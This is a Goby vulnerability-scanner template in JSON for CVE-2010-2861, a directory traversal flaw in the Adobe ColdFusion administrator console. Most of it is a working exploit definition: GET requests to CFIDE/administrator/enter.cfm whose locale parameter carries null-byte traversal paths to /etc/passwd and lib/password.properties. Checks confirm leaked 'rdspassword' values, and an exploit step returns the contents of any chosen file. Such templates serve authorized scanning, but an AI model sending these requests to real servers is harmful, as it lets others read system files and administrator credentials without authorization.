{
      "Name": "Coldfusion LFI CVE-2010-2861",
      "Level": "2",
      "Tags": [
            "lfi"
      ],
      "GobyQuery": "app=\"Adobe-ColdFusion\"",
      "Description": "Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.",
      "Product": "Adobe ColdFusion",
      "Homepage": "https://www.adobe.com/products/coldfusion-family.html",
      "Author": "aetkrad",
      "Impact": "<p>read arbitrary files<br></p>",
      "Recommendation": "",
      "References": [],
      "HasExp": true,
      "ExpParams": [
            {
                  "Name": "Filepath",
                  "Type": "select",
                  "Value": "../../../../../../../../../../etc/passwd%00en,../../../../../../../lib/password.properties%00en"
            }
      ],
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "rdspassword=",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "encrypted=",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/CFIDE/administrator/enter.cfm?locale={{{cmd}}}",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody||"
                  ]
            }
      ],
      "PostTime": "2021-11-08 15:51:21",
      "GobyVersion": "1.8.302"
}